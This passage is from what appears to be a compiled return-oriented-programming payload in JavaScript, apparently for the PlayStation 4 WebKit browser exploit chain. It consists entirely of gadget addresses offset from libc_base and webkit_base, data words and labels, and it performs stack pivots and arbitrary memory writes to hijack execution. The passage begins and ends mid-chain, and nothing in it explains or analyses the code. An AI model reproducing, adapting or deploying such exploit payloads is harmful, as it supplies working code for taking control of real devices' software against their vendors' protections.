libc_base+793877, //pop rsi
ropchain+164112, //L2441
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2441:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2442:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+164264, //L2445
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+164232, //L2443
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2443:
db([0, 0]); // 0x0
set_gadgets([
libc_base+206806, //pop rdi
//L2444:
ropchain+128, //_ps4_printf_buffer
libc_base+788575 //pop rax
]);
//L2445:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+164408, //L2448
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+164376, //L2446
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+164392, //L2447
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2446:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2447:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2448:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+164496, //L2450
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2449:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2450:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+164544, //L2451
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2451:
db([0, 0]); // 0x0
set_gadgets([
libc_base+788575, //pop rax
//L2452:
ropchain+128, //_ps4_printf_buffer
webkit_base+2997875, //mov [rax], rcx
libc_base+793877, //pop rsi
ropchain+164616, //L2453
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2453:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+164696, //L2455
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2455:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+164752, //L2457
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2457:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+164880, //L2460
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+164864, //L2459
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2459:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2460:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+164976, //L2461
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+164992, //L2462
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2461:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2462:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+165104, //L2463
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+165088, //L2464
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2464:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2463:
db([0, 0]); // 0x0
//L2405:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
write_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+166432, //L2465
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L2465:
db([0, 0]); // 0x0
//___sputc:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+166504, //L2467
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2467:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+166592, //L2469
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+166624, //L2470
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2469:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2468:
db([0, 0]); // 0x0
set_gadget(webkit_base+432898,); //pop r8
//L2470:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2471:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+166736, //L2473
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+166720, //L2472
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2472:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2473:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+166816, //L2474
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2474:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2476:
db([24, 0]); // 0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+166936, //L2479
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+166920, //L2477
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2477:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2479:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+167040, //L2480
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+167088, //L2483
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+167072, //L2482
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2480:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2481:
db([12, 0]); // 0xc
set_gadget(libc_base+206806,); //pop rdi
//L2482:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2483:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+167192, //L2486
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+167176, //L2484
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2484:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2486:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+167360, //L2489
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+167376, //L2490
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+167344, //L2487
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+167328, //L2488
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2488:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2487:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2489:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2490:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+167488, //L2493
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+167472, //L2492
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2491:
db([4294967295, 4294967295]); // -0x1
set_gadget(libc_base+206806,); //pop rdi
//L2492:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2493:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+167576, //L2494
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2494:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2496:
db([24, 0]); // 0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+167696, //L2499
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+167680, //L2497
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2497:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2499:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+167784, //L2500
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+167800, //L2502
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
//L2500:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2502:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+167856, //L2503
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2503:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2505:
db([12, 0]); // 0xc
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+168032, //L2507
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+168048, //L2508
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+168016, //L2506
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2506:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2507:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2508:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+168152, //L2509
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+168184, //L2511
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+168168, //L2510
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2509:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2510:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2511:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14959219, //cmp rax, rcx ; sete al
webkit_base+8824269, //setle al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+168352, //L2513
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+168368, //L2514
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+168336, //L2512
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2512:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2513:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2514:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+168472, //L2516
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+168536, //L2520
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+168520, //L2519
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2516:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2517:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2518:
db([1, 0]); // 0x1
set_gadget(libc_base+206806,); //pop rdi
//L2519:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2520:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+389047, //setne al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+168656, //L2521+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+168648, //L2521
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L2521:
db([0, 0]); // 0x0
set_gadgets([
ropchain+168672, //L2521+24
ropchain+172792, //L2515
libc_base+793877, //pop rsi
ropchain+168712, //L2522
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2522:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2524:
db([24, 0]); // 0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+168832, //L2527
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+168816, //L2525
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2525:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2527:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+168936, //L2528
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+168984, //L2531
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+168968, //L2530
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2528:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2529:
db([36, 0]); // 0x24
set_gadget(libc_base+206806,); //pop rdi
//L2530:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2531:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+169088, //L2534
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+169072, //L2532
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2532:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2534:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+169256, //L2537
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+169272, //L2538
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+169240, //L2535
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+169224, //L2536
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2536:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2535:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2537:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2538:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+169344, //L2539
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+169360, //L2540
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2539:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2540:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+169456, //L2542
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+169440, //L2541
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2541:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2542:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+169536, //L2543
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2543:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2545:
db([24, 0]); // 0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+169656, //L2548
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+169640, //L2546
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2546:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2548:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+169760, //L2549
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+169808, //L2552
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+169792, //L2551
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2549:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2550:
db([12, 0]); // 0xc
set_gadget(libc_base+206806,); //pop rdi
//L2551:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2552:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+169912, //L2555
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+169896, //L2553
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2553:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2555:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+170080, //L2558
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+170096, //L2559
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+170064, //L2556
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+170048, //L2557
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2557:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2556:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2558:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2559:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+170168, //L2560
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+170184, //L2561
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2560:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2561:
